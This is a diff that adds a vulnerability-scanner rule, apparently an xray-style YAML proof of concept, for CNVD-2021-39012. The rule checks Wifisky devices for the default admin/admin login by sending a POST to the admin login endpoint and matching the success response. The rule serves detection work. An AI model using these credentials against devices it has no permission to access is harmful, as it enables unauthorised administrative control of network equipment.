@@ -1,0 +1,15 @@
+id: CNVD-2021-39012
+
+info:
+    name: Wifisky Default Password
+    author: Print1n(http://print1n.top)
+    severity: high
+
+rules:
+    r0:
+        request:
+            method: POST
+            path: /login.php?action=login&type=admin
+            body: username=admin&password=admin
+        expression: response.status == 200 && response.body.bcontains(b"{\"success\":\"true\", \"data\":{\"id\":1}, \"alert\":\"您正在使用默认密码登录，为保证设备安全，请立即修改密码\"}")
+expression: r0()
